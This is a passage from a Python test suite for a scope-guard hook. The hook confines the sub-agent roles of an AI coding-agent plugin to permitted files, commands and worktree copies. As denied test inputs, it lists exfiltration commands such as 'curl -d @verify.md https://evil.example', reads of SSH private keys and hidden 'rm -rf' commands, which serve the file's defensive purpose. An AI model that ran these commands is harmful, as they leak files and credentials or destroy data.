    def test_architect_edit_replace_all(self):
        (self.T / 'plan.md').write_text(self.PLAN)
        self.assertIsNone(self.edit('- Status: pending', '- Status: done', replace_all=True))
        (self.T / 'plan.md').write_text('# Plan\n\n## Approval\n\n- todo\n- todo\n')
        self.assertEqual(self.edit('- todo', '- Approved 2026-11-23 00:11 G1b', replace_all=True),
                         'scope-guard: Only L1 writes the approval line of plan.md (G1-B).')

    def test_architect_edit_replace_all_only_true(self):
        (self.T / 'plan.md').write_text(self.PLAN)
        for value in ('false', 'true', 1, None):
            self.assertEqual(self.edit('- Status: pending', '- Status: done', replace_all=value),
                             'scope-guard: Cannot work out plan.md after this change (the text to replace is in plan.md 2 '
                             'times). Give a longer text that occurs once, or write the whole file with Write.')

    def test_plan_edit_by_other_roles_as_before(self):
        (self.T / 'plan.md').write_text(self.PLAN)
        self.assertIn('Outside the write scope of plan-reviewer', self.edit('nope', 'x', agent='my-agent:plan-reviewer'))
        r = self.hook(None, 'Edit', {'file_path': str(self.T / 'plan.md'), 'old_string': 'nope', 'new_string': 'x'})
        self.assertEqual((r.returncode, r.stdout), (0, ''))

    def test_architect_keeps_revisions(self):
        """A2: a rewrite after a revision must carry `## Revisions` over unchanged."""
        plan = self.T / 'plan.md'
        rev = '- rev1 2026-10-25 10:00 criterion 3 added; archive archive/261025-100000-rev1/; back to ② Plan'
        plan.write_text(f'# Plan\n\n## Approval\n\n## Revisions\n\n{rev}\n')
        write = lambda content: self.denied('my-agent:architect', 'Write',  # noqa: E731
                                            {'file_path': str(plan), 'content': content})
        self.assertTrue(write('# Plan v2\n\n## Approval\n'))
        self.assertTrue(write(f'# Plan v2\n\n## Approval\n\n## Revisions\n\n{rev[:-3]}\n'))
        self.assertFalse(write(f'# Plan v2\n\n## Existing work\n\n| a | keep | b |\n\n## Approval\n\n## Revisions\n\n{rev}\n'))
        self.assertTrue(self.denied('my-agent:architect', 'Edit',
                                    {'file_path': str(plan), 'old_string': rev, 'new_string': ''}))
        self.assertIn('## Revisions', self.why('my-agent:architect', 'Edit', {
            'file_path': str(plan), 'old_string': 'criterion 3', 'new_string': 'criterion 4'}))
        plan.write_text('# Plan\n\n## Approval\n')
        self.assertFalse(write('# Plan v2\n\n## Approval\n'))

    def test_secret_spellings_denied(self):
        for agent, raw in (('explorer', '.ENV'), ('verifier', 'SERVER.PEM'), ('coder', 'Id.Key')):
            with self.subTest(raw=raw):
                self.assertTrue(self.denied(f'my-agent:{agent}', 'Read', {'file_path': str(self.L / raw)}))
        self.assertTrue(self.denied('my-agent:explorer', 'Read', {'file_path': str(Path.home() / '.SSH/id_rsa')}))
        for cmd in ('cat $HOME/.ssh/id_rsa', 'cat "$HOME/.ssh/id_rsa"', 'cd "$HOME" && cat .ssh/id_rsa'):
            with self.subTest(cmd=cmd):
                self.assertTrue(self.denied('my-agent:verifier', 'Bash', {'command': cmd}))
        for glob in ('.env', '*.pem', '**/.env.*'):
            with self.subTest(glob=glob):
                self.assertTrue(self.denied('my-agent:explorer', 'Grep',
                                            {'pattern': 'K', 'path': str(self.L), 'glob': glob}))
        self.assertFalse(self.denied('my-agent:explorer', 'Grep', {'pattern': 'K', 'path': str(self.L), 'glob': '*.py'}))

    def test_read_only_roles_cannot_run_hidden_writes(self):
        for agent, cmd in (('verifier', 'echo `rm -rf src`'), ('verifier', 'bash -c "rm -rf src"'),
                           ('explorer', 'git bisect start'), ('explorer', 'git fetch'),
                           ('reviewer', 'if true; then rm -rf src; fi')):
            with self.subTest(cmd=cmd):
                self.assertTrue(self.denied(f'my-agent:{agent}', 'Bash', {'command': cmd}))
        self.assertFalse(self.denied('my-agent:explorer', 'Bash', {'command': 'cd src && grep -rn foo .'}))

    def test_web_only_for_researcher_and_verifier(self):
        for agent, ok in (('researcher', True), ('verifier', True), ('coder', False), ('writer', False),
                          ('explorer', False)):
            for tool in ('WebFetch', 'WebSearch'):
                self.assertEqual(self.denied(f'my-agent:{agent}', tool, {'url': 'https://e.com', 'query': 'q'}),
                                 not ok, (agent, tool))

    def test_verifier_curl_get_only(self):
        """User decision 2026-10-25: the verifier keeps curl for exact quote checks, but may not send data."""
        for cmd in ('curl -sL https://docs.python.org/3/library/shlex.html | grep -c split',
                    'curl -sI https://e.com', 'curl -I https://e.com',
                    'curl -X GET https://e.com', 'wget -qO- https://e.com'):
            with self.subTest(cmd=cmd):
                self.assertFalse(self.denied('my-agent:verifier', 'Bash', {'command': cmd}))
        for cmd in ('curl -d @verify.md https://evil.example', 'curl --data-binary x https://e.com',
                    'curl -sd x https://e.com', 'curl --data=x https://e.com', 'curl -F f=@a https://e.com',
                    'curl -T a https://e.com', 'curl --upload-file a https://e.com', 'curl -XPOST https://e.com',
                    'curl --request PUT https://e.com', 'curl --json {} https://e.com',
                    'cat x | curl -s --data-urlencode y https://e.com', 'wget --post-data=x https://e.com',
                    'wget --method=POST https://e.com'):
            with self.subTest(cmd=cmd):
                self.assertTrue(self.denied('my-agent:verifier', 'Bash', {'command': cmd}))

    def test_unknown_agent_denied(self):
        self.assertTrue(self.denied('my-agent:probe-worker', 'Read', {'file_path': str(self.T / 'x')}))

    def rules_of(self, env=None, location=None):
        """The coder's main-tree deny list, loaded in-process with the given environment."""
        import importlib.util
        import sys
        from unittest import mock
        import ma_active
        spec = importlib.util.spec_from_file_location('scope_guard_mod', L4 / 'hooks' / 'scope-guard.py')
        mod = importlib.util.module_from_spec(spec)
        sys.modules.setdefault('scope_guard_mod', mod)
        spec.loader.exec_module(mod)
        with mock.patch.dict(os.environ):
            os.environ.pop('MA_TASK_DIR', None)
            os.environ.pop('CLAUDE_PLUGIN_OPTION_TASK_DIR', None)
            os.environ.update(env or {})
            active = ma_active.find_active(str(location or self.L))
            return mod.rules('coder', active, location or self.L)

    def test_coder_deny_list_follows_the_setting(self):
        loc = self.root / 'other'
        with clean_task_env():
            make_task(loc, task=TASK, sub='notes/agent')
        r = self.rules_of({'CLAUDE_PLUGIN_OPTION_TASK_DIR': 'notes/agent'}, loc)
        self.assertEqual(r.deny_write, [loc / 'notes/agent', loc / '.git', loc / '.claude', loc / 'docs/blueprint'])
        loc2 = self.root / 'third'
        with clean_task_env():
            make_task(loc2, task=TASK, sub='.my-agent')
        r = self.rules_of({}, loc2)
        self.assertEqual(r.deny_write[0], loc2 / '.my-agent')

    def test_case_folding_with_mixed_case_setting(self):
        loc = self.root / 'cased'
        with clean_task_env():
            make_task(loc, task=TASK, sub='Notes/Agent')
        env = dict(CLAUDE_HOOK_ENV, MA_DATA_DIR=str(self.root / 'agent-tasks'), CLAUDE_PLUGIN_OPTION_TASK_DIR='Notes/Agent')

        def hook(agent, path):
            payload = {'hook_event_name': 'PreToolUse', 'tool_name': 'Write', 'tool_input': {'file_path': str(path)},
                       'session_id': 'sess-1', 'agent_type': agent, 'agent_id': 'a1'}
            r = run_hook('scope-guard.py', None, payload, loc, env=env, drop=('MA_TASK_DIR',))
            self.assertEqual(r.returncode, 0, r.stderr)
            return r.stdout
        self.assertIn('Outside the write scope of coder', hook('my-agent:coder', loc / 'notes/agent/x.md'))
        self.assertEqual(hook('my-agent:verifier', loc / 'notes/agent' / TASK / 'verify.md'), '')

    def test_link_layout_protects_and_allows_through_both_names(self):
        loc = self.root / 'linked'
        with clean_task_env():
            make_task(loc, task=TASK, sub='docs/agent')
        (loc / '.my-agent').symlink_to('docs/agent')
        env = dict(CLAUDE_HOOK_ENV, MA_DATA_DIR=str(self.root / 'agent-tasks'))

        def hook(agent, path):
            payload = {'hook_event_name': 'PreToolUse', 'tool_name': 'Write', 'tool_input': {'file_path': str(path)},
                       'session_id': 'sess-1', 'agent_type': agent, 'agent_id': 'a1'}
            r = run_hook('scope-guard.py', None, payload, loc, env=env, drop=('MA_TASK_DIR', 'CLAUDE_PLUGIN_OPTION_TASK_DIR'))
            self.assertEqual(r.returncode, 0, r.stderr)
            return r.stdout
        for base in ('.my-agent', 'docs/agent'):
            with self.subTest(base=base):
                self.assertEqual(hook('my-agent:verifier', loc / base / TASK / 'verify.md'), '')
                self.assertIn('Outside the write scope of coder', hook('my-agent:coder', loc / base / TASK / 'x.md'))

    def test_no_active_passes_my_agent(self):
        (records(self.L) / '.active').unlink()
        self.assertFalse(self.denied('my-agent:explorer', 'Read', {'file_path': str(self.L / 'src/a.py')}))
        self.assertFalse(self.denied('my-agent:explorer', 'Read', {'file_path': '/etc/hosts'}))

    def test_broken_active_denies_my_agent(self):
        (records(self.L) / '.active').write_text('phase: 1\n', encoding='utf-8')
        r = self.hook('my-agent:explorer', 'Read', {'file_path': str(self.L / 'src/a.py')})
        reason = json.loads(r.stdout)['hookSpecificOutput']['permissionDecisionReason']
        self.assertTrue(reason.startswith('scope-guard: ') and reason.endswith('has no `task:` line.'), reason)

    def test_coder_git_mv(self):
        coder = 'my-agent:coder'
        self.assertFalse(self.denied(coder, 'Bash', {'command': 'git mv src/a.py src/b.py'}))
        self.assertTrue(self.denied(coder, 'Bash', {'command': 'git mv src/a.py /nonexistent-outside/b.py'}))
        # readable but not writable (the data folder): the write scope is what denies it
        self.assertIn('Outside the write scope of coder',
                      self.reason(coder, f'git mv src/a.py {self.root / "agent-tasks" / "b.py"}'))
        self.assertIn('Outside the write scope of coder', self.reason(coder, f'git mv src/a.py {rel()}/x'))
        for cmd in ('git mv -f a b', 'git mv a', 'git -C sub mv a b', f'echo {rel()} | xargs git mv src/a.py src/b.py',
                    'GIT_DIR=x git mv src/a.py src/b.py', 'GIT_WORK_TREE=/x git mv src/a.py src/b.py',
                    'git add .', 'git commit -m x', 'git checkout b', 'git reset --hard'):
            with self.subTest(cmd=cmd):
                self.assertIn('Cannot tell where this command writes', self.reason(coder, cmd))

    def test_verifier_git_mv_only_reads(self):
        self.assertIn('only reads and checks', self.reason('my-agent:verifier', 'git mv a b'))

    def test_interpreter_writes_by_role(self):
        write = 'python3 -c "open(\'x\',\'w\')"'
        only_reads = 'scope-guard: Bash for {} only reads and checks (this command changes files or git state).'
        for agent in ('verifier', 'reviewer', 'explorer'):
            with self.subTest(agent=agent):
                self.assertEqual(self.reason(f'my-agent:{agent}', write), only_reads.format(agent))
        self.assertEqual(self.reason('my-agent:verifier', 'node -e "require(\'fs\').rmSync(\'a\')"'),
                         only_reads.format('verifier'))
        self.assertEqual(self.reason('my-agent:verifier', 'python3 -c "open(p,\'w\')"'), only_reads.format('verifier'))
        self.assertIsNone(self.reason('my-agent:verifier', 'python3 -c "print(open(\'src/a.txt\').read())"'))
        self.assertIsNone(self.reason('my-agent:coder', 'python3 -c "open(\'src/a.py\',\'w\')"'))
        self.assertIsNone(self.reason('my-agent:coder', 'ruby -e "File.write(\'src/a.rb\',\'x\')"'))
        self.assertEqual(self.reason('my-agent:coder', f'python3 -c "open(\'{rel()}/{TASK}/verify.md\',\'w\')"'),
                         f'scope-guard: Outside the write scope of coder: {self.T / "verify.md"}')
        self.assertEqual(self.reason('my-agent:coder', 'python3 -c "open(\'/etc/x\',\'w\')"'),
                         f'scope-guard: Outside the write scope of coder: {Path("/etc/x").resolve()}')
        self.assertTrue(self.reason('my-agent:coder', 'python3 -c "open(p,\'w\')"').startswith(
            'scope-guard: Cannot tell where this command writes'))
        self.assertIsNone(self.reason('my-agent:coder', 'python3 -c "print(1)"'))
        self.assertIsNone(self.reason('my-agent:coder', 'python3 tool.py'))   # a script file is not read: the stated limit
        self.assertTrue(self.reason('my-agent:coder', 'echo x > "$OUT"').startswith('scope-guard: Cannot tell where'))
        self.assertEqual(self.reason('my-agent:coder', f'echo y > src/b.txt; python3 -c "open(\'{rel()}/x\',\'w\')"'),
                         f'scope-guard: Outside the write scope of coder: {self.L / rel() / "x"}')

    def test_interpreter_write_by_the_coder_in_its_worktree(self):
        W = self.L / '.claude' / 'worktrees' / 'agent-x'
        W.mkdir(parents=True)
        (self.L / '.git' / 'worktrees' / 'agent-x').mkdir(parents=True)
        (W / '.git').write_text(f"gitdir: {self.L / '.git' / 'worktrees' / 'agent-x'}\n")
        cmd = 'python3 -c "open(\'a.py\',\'w\')"'
        self.assertFalse(self.denied('my-agent:coder', 'Bash', {'command': cmd}, cwd=W))
        cmd = 'python3 -c "open(\'../../../src/a.py\',\'w\')"'
        self.assertTrue(self.denied('my-agent:coder', 'Bash', {'command': cmd}, cwd=W))

    def test_only_scope_guard_reads_interpreter_code(self):
        hooks = L4 / 'hooks'
        self.assertIn('interpreter_writes', (hooks / 'scope-guard.py').read_text(encoding='utf-8'))
        for name in ('plan-approved-check.py', 'verdict-fresh-check.py'):
            with self.subTest(hook=name):
                self.assertNotIn('interpreter_writes', (hooks / name).read_text(encoding='utf-8'))

    def test_docstring_names_the_script_file_limit(self):
        import ast
        text = (L4 / 'hooks' / 'scope-guard.py').read_text(encoding='utf-8')
        doc = ' '.join((ast.get_docstring(ast.parse(text)) or '').split())
        self.assertIn('inline interpreter code', doc)
        self.assertIn('script file', doc)

    def test_script_error_exits_nonzero(self):
        payload = json.dumps({'agent_type': 'my-agent:coder', 'tool_name': 'Read', 'tool_input': 'oops',
                              'cwd': str(self.L)})
        r = run_hook('scope-guard.py', None, payload, self.L, env=self.env)
        self.assertNotEqual(r.returncode, 0)
        self.assertEqual(r.stdout, '')


class UnitCopyTest(unittest.TestCase):
    """The guard state model for per-unit copies (plan "Guard state model", rows 1-10)."""
    hook, denied = ScopeGuardTest.hook, ScopeGuardTest.denied

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.root = Path(self.tmp.name).resolve()
        self.projects = self.root / 'claude-projects'
        self.env = dict(CLAUDE_HOOK_ENV, MA_DATA_DIR=str(self.root / 'agent-tasks'), MA_CLAUDE_PROJECTS=str(self.projects))
        self.next_agent = 0

    def tearDown(self):
        self.tmp.cleanup()

    def world(self, kind):
        """A location of `kind`: 'git', 'nongit' (the repository of its copies is the store under the task folder) or
        'linked' (the location is itself a linked worktree). Returns (location, task folder, common git dir)."""
        if kind == 'git':
            L = self.root / 'git'
            T = make_task(L, task=TASK)
            common = L / '.git'
        elif kind == 'nongit':
            L = self.root / 'nongit'
            T = make_task(L, task=TASK, git=False)
            common = T / 'copy-store'
            common.mkdir()
        else:
            main = self.root / 'main'
            common = main / '.git'
            L = main / '.claude' / 'worktrees' / 'task-x'
            T = make_task(L, task=TASK, git=False)
            (common / 'worktrees' / 'task-x').mkdir(parents=True)
            (common / 'worktrees' / 'task-x' / 'commondir').write_text('../..\n')
            (L / '.git').write_text(f'gitdir: {common / "worktrees" / "task-x"}\n')
        (L / 'src').mkdir(exist_ok=True)
        (L / 'docs' / 'blueprint').mkdir(parents=True, exist_ok=True)
        self.L, self.T, self.common = L, T, common
        return L, T, common

    def copy_path(self, unit, L=None):
        return (L or self.L) / '.claude' / 'worktrees' / f'my-agent-{TASK}-{unit}'

    def add_copy(self, unit, common=None, plain=False):
        """A linked worktree of `common` at the copy path of `unit` (`plain`: a plain folder)."""
        W = self.copy_path(unit)
        (W / 'src').mkdir(parents=True)
        if not plain:
            gitdir = (common or self.common) / 'worktrees' / W.name
            gitdir.mkdir(parents=True)
            (gitdir / 'commondir').write_text('../..\n')
            (W / '.git').write_text(f'gitdir: {gitdir}\n')
        return W

    def running(self, *units):
        (self.T / 'unit-copies.json').write_text(json.dumps({'running': list(units), 'created': []}))

    def agent(self, prompt):
        """A coder whose transcript starts with `prompt` (None: no transcript); returns its agent id."""
        self.next_agent += 1
        aid = f'c{self.next_agent}'
        if prompt is not None:
            p = self.projects / 'slug' / 'sess-1' / 'subagents' / f'agent-{aid}.jsonl'
            p.parent.mkdir(parents=True, exist_ok=True)
            p.write_text(json.dumps({'type': 'user', 'message': {'role': 'user', 'content': prompt}}) + '\n')
        return aid

    def coder(self, prompt, tool, ti, cwd=None, aid=None):
        return self.denied('my-agent:coder', tool, ti, cwd=cwd or self.L, agent_id=aid or self.agent(prompt))

    def refused(self, prompt, cwd=None, why=None):
        """Every write is denied with the refusal reason, reads are allowed."""
        aid = self.agent(prompt)
        kw = dict(cwd=cwd or self.L, agent_id=aid)
        for ti in ({'file_path': str(self.L / 'src/a.py'), 'content': 'x'},
                   {'file_path': str(self.copy_path('u1') / 'src/a.py'), 'content': 'x'}):
            r = self.hook('my-agent:coder', 'Write', ti, **kw)
            out = json.loads(r.stdout)['hookSpecificOutput']['permissionDecisionReason']
            self.assertIn("Cannot tell this coder's work unit (", out)
            self.assertIn('writes are refused while unit copies run', out)
            if why:
                self.assertIn(why, out)
        self.assertTrue(self.denied('my-agent:coder', 'Bash', {'command': 'touch src/a.py'}, **kw))
        self.assertTrue(self.denied('my-agent:coder', 'Bash', {'command': f'touch {self.L}/src/a.py'}, **kw))
        self.assertFalse(self.denied('my-agent:coder', 'Read', {'file_path': str(self.T / 'plan.md')}, **kw))
        self.assertFalse(self.denied('my-agent:coder', 'Bash', {'command': 'git status'}, **kw))
        self.assertFalse(self.denied('my-agent:coder', 'Bash', {'command': f'cat {self.L}/src/a.py'}, **kw))

    def prompt(self, unit, W=None, tail='Implement it.'):
        return f'Work unit: {unit} name\n' + (f'Worktree: {W}\n' if W else '') + tail

    def test_own_copy_writes(self):
        """Row 7 in a git location, a non-git location and a location that is a linked worktree."""
        for kind in ('git', 'nongit', 'linked'):
            with self.subTest(kind=kind):
                L, T, common = self.world(kind)
                W1, W2 = self.add_copy('u1'), self.add_copy('u2')
                self.running('u1', 'u2')
                p = self.prompt('u1', W1)
                for cwd in (L, W1):
                    with self.subTest(cwd=str(cwd)):
                        for tool, ti in (('Write', {'file_path': str(W1 / 'src/a.py'), 'content': 'x'}),
                                         ('Edit', {'file_path': str(W1 / 'src/a.py')}),
                                         ('Bash', {'command': f'touch {W1}/src/b.py'}),
                                         ('Bash', {'command': f'cd {W1} && touch src/c.py'}),
                                         ('Read', {'file_path': str(W1 / 'src/a.py')}),
                                         ('Read', {'file_path': str(T / 'plan.md')})):
                            self.assertFalse(self.coder(p, tool, ti, cwd=cwd), (tool, ti))
                        for path in (L / 'src/a.py', W2 / 'src/a.py', W1 / '.git/x', W1 / '.claude/settings.local.json',
                                     W1 / '.claude/hooks/x', W1 / 'docs/blueprint/decisions.md',
                                     L / 'docs/blueprint/decisions.md', records(L) / 'x/y', T / 'work/a.md',
                                     common / 'worktrees' / W1.name / 'index', T / 'copy-store/HEAD'):
                            self.assertTrue(self.coder(p, 'Write', {'file_path': str(path), 'content': 'x'}, cwd=cwd), path)
                        self.assertTrue(self.coder(p, 'Bash', {'command': f'touch {L}/src/a.py'}, cwd=cwd))
                        self.assertTrue(self.coder(p, 'Bash', {'command': f'cd {W1} && touch .claude/x'}, cwd=cwd))
                        self.assertTrue(self.coder(p, 'Bash', {'command': f'cd {W1} && touch {W1.parent}/y'}, cwd=cwd))

    def test_copy_path_that_is_missing_or_plain_is_refused(self):
        self.world('git')
        W1 = self.copy_path('u1')
        self.running('u1')
        self.refused(self.prompt('u1', W1))
        self.add_copy('u1', plain=True)
        self.refused(self.prompt('u1', W1))

    def test_unrelated_repository_copy_is_refused(self):
        self.world('git')
        other = self.root / 'other' / '.git'
        other.mkdir(parents=True)
        W1 = self.add_copy('u1', common=other)
        self.running('u1')
        self.refused(self.prompt('u1', W1))

    def test_no_worktree_line_while_the_unit_runs_is_refused(self):
        self.world('git')
        self.add_copy('u1')
        self.running('u1')
        self.refused(self.prompt('u1'))
        self.refused(self.prompt('u1', tail='\nWorktree: ' + str(self.copy_path('u1'))))   # not the second line

    def test_copy_of_a_unit_that_no_longer_runs_is_refused(self):
        self.world('git')
        W1 = self.add_copy('u1')
        self.running('u2')
        self.refused(self.prompt('u1', W1))
        self.running()
        self.refused(self.prompt('u1', W1))   # row 8 holds with nothing running

    def test_main_tree_rerun_of_a_unit_with_a_kept_copy(self):
        self.world('git')
        W1 = self.add_copy('u1')
        self.running()
        p = self.prompt('u1')
        self.assertFalse(self.coder(p, 'Edit', {'file_path': str(self.L / 'src/a.py')}))
        self.assertFalse(self.coder(p, 'Bash', {'command': 'touch src/x.py'}))
        self.assertTrue(self.coder(p, 'Write', {'file_path': str(W1 / 'src/a.py'), 'content': 'x'}))
        self.assertTrue(self.coder(p, 'Bash', {'command': f'touch {W1}/src/b.py'}))
        self.assertTrue(self.coder(p, 'Write', {'file_path': str(self.L / '.claude/settings.local.json'), 'content': 'x'}))

    def test_other_unit_with_a_kept_copy_keeps_the_main_tree_rules(self):
        self.world('git')
        W1, W2, W3 = self.add_copy('u1'), self.add_copy('u2'), self.add_copy('u3')
        self.running('u1', 'u2')
        p = self.prompt('u3')
        self.assertFalse(self.coder(p, 'Write', {'file_path': str(self.L / 'src/a.py'), 'content': 'x'}))
        for W in (W1, W2, W3):
            self.assertTrue(self.coder(p, 'Write', {'file_path': str(W / 'src/a.py'), 'content': 'x'}), W)
        self.refused('Please fix the build.')                # no `Work unit:` and no `Worktree:` line (row 3)

    def test_work_unit_must_be_the_first_line(self):
        self.world('git')
        self.running('u1')
        self.refused('Intro\nWork unit: u9 elsewhere')
        self.refused('\nWork unit: u9 elsewhere')

    def test_second_line_is_the_only_worktree_line(self):
        self.world('git')
        W1 = self.add_copy('u1')
        self.running('u2')
        elsewhere = self.root / 'elsewhere'
        p = self.prompt('u1', tail=f'Pass list:\nWorktree: {elsewhere}\n')   # u1 not running, no line under the first
        self.assertFalse(self.coder(p, 'Write', {'file_path': str(self.L / 'src/a.py'), 'content': 'x'}))
        self.running('u1')
        own = self.prompt('u1', W1, tail=f'Notes\nWorktree: {elsewhere}\n')
        self.assertFalse(self.coder(own, 'Write', {'file_path': str(W1 / 'src/a.py'), 'content': 'x'}))
        self.assertTrue(self.coder(own, 'Write', {'file_path': str(self.L / 'src/a.py'), 'content': 'x'}))

    def test_other_worktree_paths_are_refused(self):
        self.world('git')
        W1, W2 = self.add_copy('u1'), self.add_copy('u2')
        for running in (('u1', 'u2'), ()):
            self.running(*running)
            self.refused(self.prompt('u1', W2))                 # another unit's copy (row 9)
            self.refused(self.prompt('u1', self.L / 'src'))     # outside the copies folder
            self.refused(self.prompt('u1', self.root / 'x'))
        self.running()
        self.refused('Fix it.\nWorktree: ' + str(W1))           # a path under no unit (row 10)
        self.refused('Work unit: x\nWorktree: ' + str(W1))

    def test_no_transcript(self):
        self.world('git')
        self.add_copy('u1')
        self.running('u1')
        self.refused(None)
        aid = self.agent(None)
        r = self.hook('my-agent:coder', 'Read', {'file_path': str(self.L / 'src/a.py')}, agent_id=aid)
        self.assertEqual(r.stdout, '')
        self.running()
        self.assertFalse(self.coder(None, 'Write', {'file_path': str(self.L / 'src/a.py'), 'content': 'x'}))
        (self.T / 'unit-copies.json').unlink()
        self.assertFalse(self.coder(None, 'Write', {'file_path': str(self.L / 'src/a.py'), 'content': 'x'}))

    def test_no_agent_id_or_session_counts_as_prompt_not_read(self):
        self.world('git')
        W1 = self.add_copy('u1')
        self.running('u1')
        aid = self.agent(self.prompt('u1', W1))
        for kw in (dict(agent_id=aid, session=None), dict(agent_id='')):
            r = self.hook('my-agent:coder', 'Write', {'file_path': str(W1 / 'src/a.py'), 'content': 'x'}, **kw)
            self.assertIn('Cannot tell', json.loads(r.stdout)['hookSpecificOutput']['permissionDecisionReason'])

    def test_rules_without_session_id_or_agent_id(self):
        import importlib.util
        spec = importlib.util.spec_from_file_location('scope_guard_under_test', L4 / 'hooks' / 'scope-guard.py')
        guard = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(guard)
        L, T, _ = self.world('git')
        active = ma_active.find_active(str(L))
        with mock.patch.dict(os.environ, dict(MA_DATA_DIR=str(self.root / 'agent-tasks'))):
            self.assertEqual(guard.rules('coder', active, L).write, [L])
            self.running('u1')
            self.assertEqual(guard.rules('coder', active, L).write, [])
            (T / 'unit-copies.json').write_text('{not json')
            self.assertEqual(guard.rules('coder', active, L).write, [])
            (T / 'unit-copies.json').write_text('[]')   # not the state file's shape: fail closed too
            self.assertEqual(guard.rules('coder', active, L, None, None).write, [])
            (T / 'unit-copies.json').unlink()
            self.assertEqual(guard.rules('coder', active, L, None, None).write, [L])

    def test_hook_call_from_inside_a_copy(self):
        for kind in ('nongit', 'git'):
            with self.subTest(kind=kind):
                L, T, _ = self.world(kind)
                W1 = self.add_copy('u1')
                self.running('u1')
                p = self.prompt('u1', W1)
                for cwd in (L, W1, W1 / 'src'):
                    self.assertFalse(self.coder(p, 'Write', {'file_path': str(W1 / 'src/a.py'), 'content': 'x'}, cwd=cwd))
                    self.assertTrue(self.coder(p, 'Write', {'file_path': str(L / 'src/a.py'), 'content': 'x'}, cwd=cwd))

    ALLOWED = ('git -C {W} status', 'git -C {W} diff', 'cd {W} && git log -3', 'git -C {W} stash list',
               'cd {W} && git branch', 'git -C {W} tag', 'git -C {W} config --get core.bare', 'git -C {W} worktree list',
               'git -C {W} remote -v')
    DENIED = ('cd {W} && git add -A', 'git -C {W} add -A', 'git --git-dir {S} add -A', 'cd {W} && git mv a b',
              "sh -c 'cd {W} && git mv a b'", 'cd {W} && git branch --set-upstream-to=x', 'cd {W} && git config --edit',
              'cd {W} && git config -e', 'git --git-dir={S} --work-tree={L} status', 'GIT_DIR={S} git status')

    def test_git_commands_of_a_copy_coder(self):
        for kind in ('git', 'nongit', 'linked'):
            with self.subTest(kind=kind):
                L, T, common = self.world(kind)
                W1 = self.add_copy('u1')
                self.running('u1')
                p = self.prompt('u1', W1)
                fill = dict(W=W1, S=common, L=L)
                for cmd in self.ALLOWED:
                    self.assertFalse(self.coder(p, 'Bash', {'command': cmd.format(**fill)}, cwd=W1), cmd)
                for cmd in self.DENIED:
                    self.assertTrue(self.coder(p, 'Bash', {'command': cmd.format(**fill)}, cwd=W1), cmd)

    def test_git_mv_stays_allowed_for_main_tree_and_f19_coders(self):
        L, T, _ = self.world('git')
        self.assertFalse(self.denied('my-agent:coder', 'Bash', {'command': 'git mv src/a src/b'}))
        self.running('u2')
        self.assertFalse(self.coder('Work unit: u3\n', 'Bash', {'command': 'git mv src/a src/b'}))
        (L / '.git' / 'worktrees' / 'agent-x').mkdir(parents=True)
        W = L / '.claude' / 'worktrees' / 'agent-x'
        (W / 'src').mkdir(parents=True)
        (W / '.git').write_text(f"gitdir: {L / '.git' / 'worktrees' / 'agent-x'}\n")
        self.assertFalse(self.denied('my-agent:coder', 'Bash', {'command': 'git mv src/a src/b'}, cwd=W))
        self.assertFalse(self.denied('my-agent:coder', 'Write', {'file_path': str(W / 'src/a.py')}, cwd=W))

    def real_git(self, args, cwd, **kw):
        env = dict(os.environ, GIT_CONFIG_GLOBAL='/dev/null', GIT_CONFIG_NOSYSTEM='1', GIT_AUTHOR_NAME='t',
                   GIT_AUTHOR_EMAIL='t@t', GIT_COMMITTER_NAME='t', GIT_COMMITTER_EMAIL='t@t')
        return subprocess.run(args, cwd=cwd, env=env, capture_output=True, text=True, **kw)

    def snapshot(self, gitdir, skip):
        out = {}
        for p in sorted(Path(gitdir).rglob('*')):
            if p.is_file() and p != skip:
                out[str(p.relative_to(gitdir))] = (p.stat().st_size, p.read_bytes())
        return out

    def test_read_commands_write_nothing_in_the_git_dir_but_the_copy_index(self):
        """Settles the To confirm item: what git writes when the allowed read forms run in a copy."""
        if shutil.which('git') is None:
            self.skipTest('no git program')
        forms = ['status', 'diff', 'log -3', 'stash list', 'stash show', 'branch', 'branch -a', 'branch -v',
                 'branch --show-current', 'tag', 'tag -l', 'config --get core.bare', 'config --get-all core.bare',
                 'config --list', 'worktree list', 'worktree list --porcelain', 'remote', 'remote -v', 'show HEAD',
                 'blame f.txt', 'annotate f.txt', 'ls-files', 'ls-tree HEAD', 'rev-parse HEAD', 'grep x',
                 'cat-file -p HEAD', 'describe --always', 'shortlog -s HEAD', 'rev-list HEAD', 'merge-base HEAD HEAD',
                 'name-rev HEAD', 'show-ref', 'for-each-ref', 'count-objects', 'check-ignore -q f.txt',
                 'whatchanged', 'var GIT_AUTHOR_IDENT', 'help', 'version']
        for kind in ('nongit', 'git'):
            with self.subTest(kind=kind):
                L = self.root / f'real-{kind}'
                T = make_task(L, task=TASK, git=False)
                (L / 'f.txt').write_text('x\n')
                if kind == 'git':
                    gitdir, base = L / '.git', ['git']
                    self.real_git(['git', 'init', '-q'], L)
                else:
                    gitdir = T / 'copy-store'
                    base = ['git', f'--git-dir={gitdir}', f'--work-tree={L}']
                    self.real_git(['git', 'init', '-q', '--bare', str(gitdir)], L)
                self.real_git(base + ['add', 'f.txt'], L)
                self.real_git(base + ['commit', '-q', '-m', 'base'], L)
                W = self.copy_path('u1', L)
                r = self.real_git(base + ['worktree', 'add', '-q', '--detach', str(W)], L)
                self.assertEqual(r.returncode, 0, r.stderr)
                (W / 'f.txt').write_text('y\n')
                self.real_git(['git', 'stash', '-q'], W)
                (W / 'f.txt').write_text('z\n')
                (T / 'unit-copies.json').write_text(json.dumps({'running': ['u1'], 'created': []}))
                self.L, self.T = L, T
                p = self.prompt('u1', W)
                index = gitdir / 'worktrees' / W.name / 'index'
                before = self.snapshot(gitdir, index)
                for form in forms:
                    for cmd in (f'cd {W} && git {form}', f'git -C {W} {form}'):
                        with self.subTest(cmd=cmd):
                            self.assertFalse(self.coder(p, 'Bash', {'command': cmd}, cwd=W), cmd)
                            self.real_git(['sh', '-c', cmd], L, timeout=30)
                            after = self.snapshot(gitdir, index)
                            changed = sorted(k for k in set(before) | set(after) if before.get(k) != after.get(k))
                            self.assertEqual(changed, [], f'{cmd}: git wrote {changed} in {gitdir}')


if __name__ == '__main__':
    unittest.main()
